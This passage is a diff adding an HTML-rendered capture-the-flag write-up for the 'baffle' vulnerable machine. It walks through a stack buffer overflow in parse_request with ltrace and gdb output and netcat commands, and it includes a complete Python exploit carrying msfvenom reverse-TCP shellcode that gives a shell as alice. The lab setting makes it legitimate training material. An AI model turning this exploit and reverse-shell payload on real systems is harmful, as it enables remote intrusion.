+&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, 2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 11
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffbc7308b0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffbc7308b0
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffbc7306a0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffbc7306a0
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffbc730ab0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffbc730ab0
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x600de0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x600de0
+strlen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 9
+memcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffbc730ab0, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;..., 2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffbc730ab0
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGSEGV &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Segmentation fault&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
++++ killed by SIGSEGV +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;0x01 was easy enough to get around, I just had to pad flag.txt with some extra spaces.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64/baffle# python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'print &quot;\x01&quot; * 2 + &quot;flag.txt      &quot;'&lt;/span&gt; | nc 10.0.1.9 6969
+FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;is_there_an_ivana_tinkle&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Awesome, we got ourselves our first (second, I’ll explain later) flag.&lt;/p&gt;
+
+&lt;p&gt;I played around with this for some time. There is a buffer overflow when you send in 0x01 and 1032 bytes we are able to gain control of the return address, I couldn’t turn this into a shell though as we learn that ASLR is enabled on this host.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64/baffle# python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'print &quot;\x01&quot; * 2 + &quot;/proc/sys/kernel/randomize_va_space      &quot;'&lt;/span&gt; | nc 10.0.1.9 6969
+2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I had to look for another method to get my shell. I noticed that sending in 0x02 would always result in a seg fault. The cause of this appears to be a memcpy() at the end that is writing 2000 bytes to a portion of the stack 528 bytes from the RBP. As you can see in the output below, the memcpy() is writing 2000 bytes to 0x7fffffffd8a0 which is 528 bytes from the RBP which is 0x7fffffffdab0.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;…SNIP…
+
+RBP: 0x7fffffffdab0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x7fffffffe2b0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x400980 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;__libc_csu_init&amp;gt;:	push   r15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+…SNIP…
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------code-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x4008e0 &amp;lt;parse_request+410&amp;gt;:	mov    edx,0x7d0
+   0x4008e5 &amp;lt;parse_request+415&amp;gt;:	mov    rsi,rcx
+   0x4008e8 &amp;lt;parse_request+418&amp;gt;:	mov    rdi,rax
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 0x4008eb &amp;lt;parse_request+421&amp;gt;:	call   0x400620 &amp;lt;memcpy@plt&amp;gt;
+   0x4008f0 &amp;lt;parse_request+426&amp;gt;:	mov    eax,0x0
+   0x4008f5 &amp;lt;parse_request+431&amp;gt;:	leave  
+   0x4008f6 &amp;lt;parse_request+432&amp;gt;:	ret    
+   0x4008f7 &amp;lt;main&amp;gt;:	push   rbp
+Guessed arguments:
+arg[0]: 0x7fffffffd8a0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x0
+arg[1]: 0x7fffffffdae4 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x0
+arg[2]: 0x7d0
+arg[3]: 0x7fffffffdae4 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x0
+
+root@kali:/mnt/hgfs/kali64/baffle# python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'print 0x7fffffffdab0 - 0x7fffffffd8a0'&lt;/span&gt;
+528
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So now we know that we can control the return address in RBP, I nailed down some exact numbers keeping in mind that we had to fill the entire 2000 bytes for memcpy.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'print &quot;\x02\x02\x00&quot; + &quot;A&quot; * 534 + &quot;B&quot; * 8 + &quot;C&quot; * 1464'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; input
+
+…SNIP…
+
+RAX: 0x0
+RBX: 0x0
+RCX: 0x7fffffffe040 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 39 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RDX: 0x7fffffffe040 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 39 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RSI: 0x7fffffffdaf9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RDI: 0x7fffffffd8a0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RBP: 0x4242424242424242 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'BBBBBBBB'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RSP: 0x7fffffffdab8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RIP: 0x4008f6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;parse_request+432&amp;gt;:	ret&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+R8 : 0x259
+R9 : 0x249
+R10: 0x239
+R11: 0x7ffff7ac5a10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;__memcpy_sse2_unaligned&amp;gt;:	mov    rax,rsi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+R12: 0x400650 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;_start&amp;gt;:	xor    ebp,ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+R13: 0x7fffffffe390 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x246 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;carry PARITY adjust ZERO sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------code-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+   0x4008eb &amp;lt;parse_request+421&amp;gt;:	call   0x400620 &amp;lt;memcpy@plt&amp;gt;
+   0x4008f0 &amp;lt;parse_request+426&amp;gt;:	mov    eax,0x0
+   0x4008f5 &amp;lt;parse_request+431&amp;gt;:	leave  
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 0x4008f6 &amp;lt;parse_request+432&amp;gt;:	ret    
+   0x4008f7 &amp;lt;main&amp;gt;:	push   rbp
+   0x4008f8 &amp;lt;main+1&amp;gt;:	mov    rbp,rsp
+   0x4008fb &amp;lt;main+4&amp;gt;:	sub    rsp,0x7f0
+   0x400902 &amp;lt;main+11&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x7e4],edi
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------stack-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+0000| 0x7fffffffdab8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0008| 0x7fffffffdac0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0016| 0x7fffffffdac8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0024| 0x7fffffffdad0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0032| 0x7fffffffdad8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0040| 0x7fffffffdae0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0048| 0x7fffffffdae8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0056| 0x7fffffffdaf0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+Legend: code, data, rodata, value
+0x00000000004008f6 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;parse_request &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The next challenge was to find out where to put our shellcode. Luckily, the binary tosses all of our data into a local variable named ‘to_write’ as you can see below.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|    |     0x004008b0    bae00d6000     mov edx, sym.to_write          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;60802&quot;&lt;/span&gt; @ 0x600de0
+|    |     0x004008b5    b93e000000     mov ecx, 0x3e                  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;gt;'&lt;/span&gt;
+|    |     0x004008ba    4889d7         mov rdi, rdx
+|    |     0x004008bd    4889c6         mov rsi, rax
+|    |     0x004008c0    f348a5         rep movsq qword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rdi], qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsi]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this point it was rather simple. We just had to overwrite our return address with that of to_write and were golden.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;s&quot;&gt;'''
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.60 LPORT=443 -b &quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; -f python -v shellcode
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86_64 from the payload
+Found 2 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=42, char=0x00)
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 111 (iteration=0)
+x64/xor chosen with final size 111
+Payload size: 111 bytes
+Final size of python file: 620 bytes
+'''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xc9\x48\x81\xe9\xf7\xff\xff\xff\x48\x8d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x05\xef\xff\xff\xff\x48\xbb\x51\xe7\x72\x45\x85&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2e\x70\xc6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xe2\xf4\x19\xd6\x8d\x2f\x8c\x76\xe9\x70\x41&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xaf\xfb\x93\xc8\x1f\xb9\xac\x73\xa6\x28\xf7\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x21\x75\x90\x01\x8d\x5b\x1d\x1c\x44\x72\x99\x3b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe6\x2c\x4a\x80\x66\xe7\x8e\xe8\xe5\x72\x44\x3e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x24\x70\xc7\x59\xb6\x3a\xcc\x63\x44\x60\x9c\x3b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcd\x2a\x4a\x80\x77\x2e\x9c\x5e\xe2\x8d\xa3\x85&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2e\x70\xc6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\x02\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;522&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600de0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1450&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Simple matter of setting up my multi/handler and piping the output to nc to get a shell as the Alice user.&lt;/p&gt;
+
+&lt;p&gt;A bit of poking around and we find yet another binary named flag_vault in /home/bob/filez. This binary read a password from auth.txt to dump the contents of flag.txt. Local testing showed that it would seg fault if auth.txt and flag.txt weren’t available.&lt;/p&gt;
+
+&lt;p&gt;Another hint in Alice’s inbox showed that the password for bob was in flag.txt&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mail
+Mail version 8.1.2 01/15/2001.  Type ? &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help.
+&lt;span class=&quot;s2&quot;&gt;&quot;/var/mail/alice&quot;&lt;/span&gt;: 1 message 1 new
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;N  1 bob@baffle.me      Thu Jan  2 11:38   21/559   Flag &lt;span class=&quot;c&quot;&gt;#2&lt;/span&gt;
+&amp;amp; 1
+1
+Message 1:
+From bob@baffle.me  Thu Jan  2 11:38:22 2014
+X-Original-To: alice
+From: Bob &amp;lt;bob@baffle.me&amp;gt;
+To: alice@baffle.me
